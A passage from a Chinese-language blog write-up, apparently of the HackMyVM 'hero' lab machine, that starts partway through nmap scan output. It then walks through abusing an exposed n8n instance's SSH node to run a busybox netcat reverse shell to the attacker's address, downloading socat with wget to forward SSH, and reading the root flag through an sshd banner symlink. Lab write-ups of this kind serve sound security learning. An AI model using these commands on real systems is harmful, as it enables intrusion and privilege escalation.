escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;link<span class="char escape_">\x</span>20rel=\</span></span><br><span class="line"><span class="string">SF:&quot;</span>icon\<span class="string">&quot;<span class="char escape_">\x</span>20href=<span class="char escape_">\&quot;</span>/favicon<span class="char escape_">\.</span>ico<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;style&gt;@media<span class="char escape_">\x</span>20<span class="char escape_">\(</span>prefers</span></span><br><span class="line"><span class="string">SF:-color-scheme:<span class="char escape_">\x</span>20dark<span class="char escape_">\)</span><span class="char escape_">\x</span>20&#123;<span class="char escape_">\x</span>20body<span class="char escape_">\x</span>20&#123;<span class="char escape_">\x</span>20background-color:<span class="char escape_">\x</span>20rgb\</span></span><br><span class="line"><span class="string">SF:(45,<span class="char escape_">\x</span>2046,<span class="char escape_">\x</span>2046<span class="char escape_">\)</span><span class="char escape_">\x</span>20&#125;<span class="char escape_">\x</span>20&#125;&lt;/style&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20type=<span class="char escape_">\&quot;</span>text/javas</span></span><br><span class="line"><span class="string">SF:cript<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\t</span>window<span class="char escape_">\.</span>BASE_PATH<span class="char escape_">\x</span>20=<span class="char escape_">\x</span>20&#x27;/&#x27;;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\t</span>window<span class="char escape_">\.</span>REST_ENDP</span></span><br><span class="line"><span class="string">SF:OINT<span class="char escape_">\x</span>20=<span class="char escape_">\x</span>20&#x27;rest&#x27;;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20src=<span class="char escape_">\&quot;</span>/rest/sentry\</span></span><br><span class="line"><span class="string">SF:.js<span class="char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script&gt;!function<span class="char escape_">\(</span>t,e<span class="char escape_">\)</span>&#123;var<span class="char escape_">\x</span>20o,n,&quot;</span>)%r(HTTPOptio</span><br><span class="line">SF:ns,<span class="number">183</span>,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20404<span class="char escape_">\x</span>20Not<span class="char escape_">\x</span>20Found<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Security-Policy:<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0default-src<span class="char escape_">\x</span>20&#x27;none&#x27;<span class="char escape_">\r</span><span class="char escape_">\n</span>X-Content-Type-Options:<span class="char escape_">\x</span>20nosniff<span class="char escape_">\r</span><span class="char escape_">\n</span>Content</span></span><br><span class="line"><span class="string">SF:-Type:<span class="char escape_">\x</span>20text/html;<span class="char escape_">\x</span>20charset=utf-8<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length:<span class="char escape_">\x</span>20143<span class="char escape_">\r</span><span class="char escape_">\n</span>Vary</span></span><br><span class="line"><span class="string">SF::<span class="char escape_">\x</span>20Accept-Encoding<span class="char escape_">\r</span><span class="char escape_">\n</span>Date:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span>2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span>2013:32:19\</span></span><br><span class="line"><span class="string">SF:x20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection:<span class="char escape_">\x</span>20close<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;!DOCTYPE<span class="char escape_">\x</span>20html&gt;<span class="char escape_">\n</span>&lt;html<span class="char escape_">\x</span>20lang</span></span><br><span class="line"><span class="string">SF:=<span class="char escape_">\&quot;</span>en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;head&gt;<span class="char escape_">\n</span>&lt;meta<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;title&gt;Error&lt;/title&gt;<span class="char escape_">\n</span>&lt;/</span></span><br><span class="line"><span class="string">SF:head&gt;<span class="char escape_">\n</span>&lt;body&gt;<span class="char escape_">\n</span>&lt;pre&gt;Cannot<span class="char escape_">\x</span>20OPTIONS<span class="char escape_">\x</span>20/&lt;/pre&gt;<span class="char escape_">\n</span>&lt;/body&gt;<span class="char escape_">\n</span>&lt;/html&gt;<span class="char escape_">\n</span>&quot;</span>)%</span><br><span class="line">SF:r(RTSPRequest,<span class="number">183</span>,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20404<span class="char escape_">\x</span>20Not<span class="char escape_">\x</span>20Found<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Security</span></span><br><span class="line"><span class="string">SF:-Policy:<span class="char escape_">\x</span>20default-src<span class="char escape_">\x</span>20&#x27;none&#x27;<span class="char escape_">\r</span><span class="char escape_">\n</span>X-Content-Type-Options:<span class="char escape_">\x</span>20nosniff</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type:<span class="char escape_">\x</span>20text/html;<span class="char escape_">\x</span>20charset=utf-8<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length:<span class="char escape_">\x</span>20</span></span><br><span class="line"><span class="string">SF:143<span class="char escape_">\r</span><span class="char escape_">\n</span>Vary:<span class="char escape_">\x</span>20Accept-Encoding<span class="char escape_">\r</span><span class="char escape_">\n</span>Date:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span>2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:2013:32:19<span class="char escape_">\x</span>20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection:<span class="char escape_">\x</span>20close<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;!DOCTYPE<span class="char escape_">\x</span>20html&gt;<span class="char escape_">\n</span>&lt;h</span></span><br><span class="line"><span class="string">SF:tml<span class="char escape_">\x</span>20lang=<span class="char escape_">\&quot;</span>en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;head&gt;<span class="char escape_">\n</span>&lt;meta<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;title&gt;Error&lt;</span></span><br><span class="line"><span class="string">SF:/title&gt;<span class="char escape_">\n</span>&lt;/head&gt;<span class="char escape_">\n</span>&lt;body&gt;<span class="char escape_">\n</span>&lt;pre&gt;Cannot<span class="char escape_">\x</span>20OPTIONS<span class="char escape_">\x</span>20/&lt;/pre&gt;<span class="char escape_">\n</span>&lt;/body&gt;<span class="char escape_">\n</span>&lt;</span></span><br><span class="line"><span class="string">SF:/html&gt;<span class="char escape_">\n</span>&quot;</span>);</span><br><span class="line">MAC <span class="params">Address:</span> DE:<span class="number">86</span>:<span class="number">60</span>:<span class="number">02</span>:F4:<span class="number">97</span> (Unknown)</span><br><span class="line"><span class="params">Warning:</span> OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">3.41</span> ms bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">13.35</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>我发现wc这不是藏了一个端口吗，而且还有http服务，我一访问，结果就是这个n8n<br>所以一直不是我的n8n配置啥的出问题了，因为这个是靶机的n8n!!!!<br>所以我就是看聊天记录就先入为主了，自己信息收集的还不完整，吃个教训了 <br><br>然后按图中输入就可以连接成功了<br><img src="https://pic1.imgdb.cn/item/67a6229bd0e0a243d4fca313.png"><br>接着去workflow中 配置下，第二个节点选ssh执行命令<br><img src="https://pic1.imgdb.cn/item/67a6229cd0e0a243d4fca314.png"><br>双击这个ssh就可以进入执行命令了<br><img src="https://pic1.imgdb.cn/item/67a62297d0e0a243d4fca310.png"><br>但是直接用nc命令不行，提醒我们要用busybox ， busybox就是整合了一系列linux工具的小集合<br>执行的命令为</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">busybox</span> nc <span class="number">192.168.179.11</span> <span class="number">1234</span> -e /bin/sh</span><br></pre></td></tr></table></figure></div>
+<p>成功拿到webshell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>现在的问题是这个shell不稳定，要得到一个稳定的shell<br>用群主的方法 利用socat转发端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port<span class="number"> 80 </span>(http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">cd /tmp  </span><br><span class="line">wget 192.168.179.11/socat</span><br><span class="line">ls -al</span><br><span class="line">total 372</span><br><span class="line">drwxrwxrwt   <span class="number"> 4 </span>root     root          <span class="number"> 100 </span>Feb <span class="number"> 7 </span>14:56 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 21 </span>root     root         <span class="number"> 4096 </span>Feb <span class="number"> 6 </span>10:03 ..</span><br><span class="line">drwxrwxrwt   <span class="number"> 2 </span>root     root           <span class="number"> 40 </span>Feb <span class="number"> 7 </span>12:35 .ICE-unix</span><br><span class="line">drwxrwxrwt   <span class="number"> 2 </span>root     root           <span class="number"> 40 </span>Feb <span class="number"> 7 </span>12:35 .X11-unix</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>shawa    shawa      <span class="number"> 375176 </span>Feb <span class="number"> 7 </span>14:56 socat</span><br><span class="line">chmod +x socat</span><br><span class="line">./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &amp;</span><br><span class="line">busybox netstat -lntup</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>172.17.0.1:22           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:2222            0.0.0.0:*               LISTEN      3105/socat</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:5678            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>:::5678                 :::*                    LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>:::80                   :::*                    LISTEN      -</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>然后就可以用ssh和私钥连接了 拿到稳定shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># ssh shawa<span class="comment">@192.168.179.81 -i tmp -p 2222</span></span></span><br><span class="line"><span class="comment"><span class="meta">The authenticity of host &#x27;[192.168.179.81]:2222 ([192.168.179.81]:2222)&#x27; can&#x27;t be established.</span></span></span><br><span class="line"><span class="comment"><span class="meta">ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.</span></span></span><br><span class="line"><span class="comment"><span class="meta">This key is not known by any other names.</span></span></span><br><span class="line"><span class="comment"><span class="meta">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span></span><br><span class="line"><span class="comment"><span class="meta">Warning: Permanently added &#x27;[192.168.179.81]:2222&#x27; (ED25519) to the list of known hosts.</span></span></span><br><span class="line"><span class="comment"><span class="meta">shawa was here.</span></span></span><br><span class="line"><span class="comment"><span class="meta">Welcome to Alpine!</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">The Alpine Wiki contains a large amount of how-to guides and general</span></span></span><br><span class="line"><span class="comment"><span class="meta">information about administrating Alpine systems.</span></span></span><br><span class="line"><span class="comment"><span class="meta">See &lt;https://wiki.alpinelinux.org/&gt;.</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">You can setup the system with the command: setup-alpine</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">You may change this message by editing /etc/motd.</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">hero:~$ </span></span></span><br></pre></td></tr></table></figure></div>
+<p>sudo 和 suid没有啥可以用上的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hero:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">-sh: <span class="built_in">sudo</span>: not found</span><br><span class="line">hero:~$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/bin/bbsuid</span><br><span class="line">hero:~$ </span><br></pre></td></tr></table></figure></div>
+<p>经过群里大佬们提醒，提权用ssh的banner找到sshd配置文件中的banner位置</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">no</span> <span class="keyword">default</span> banner <span class="type">path</span></span><br><span class="line">Banner /opt/banner.txt </span><br></pre></td></tr></table></figure></div>
+<p>做一个软链接</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hero:/etc/ssh$ <span class="built_in">cd</span> /opt</span><br><span class="line">hero:/opt$ <span class="built_in">ls</span></span><br><span class="line">banner.txt  containerd</span><br><span class="line">hero:/opt$ <span class="built_in">rm</span> banner.txt</span><br><span class="line">hero:/opt$ <span class="built_in">ln</span> -s /root/root.txt banner.txt</span><br><span class="line">hero:/opt$ </span><br></pre></td></tr></table></figure></div>
+<p>然后再ssh连接 就有flag了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh shawa@192.168.179.81 -i tmp -p 2222</span></span><br><span class="line">HMVNOTINPRODLOL</span><br><span class="line">Welcome <span class="built_in">to</span> Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki <span class="keyword">contains</span> <span class="keyword">a</span> large amount <span class="keyword">of</span> how-<span class="built_in">to</span> guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;<span class="keyword">https</span>://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup <span class="keyword">the</span> <span class="keyword">system</span> <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">setup-alpine</span></span><br><span class="line"></span><br><span class="line">You may change this message <span class="keyword">by</span> editing /etc/motd.</span><br><span class="line"></span><br><span class="line">hero:~$ </span><br></pre></td></tr></table></figure></div>
+
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/20816.html" title="HMV-hero">https://guayu-kakeru.github.io/posts/20816.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/8393.html" rel="prev" title="IA: Keyring">
+      <i class="fa fa-chevron-left"></i> IA: Keyring
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/24112.html" rel="next" title="HMV-Listen">
+      HMV-Listen <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
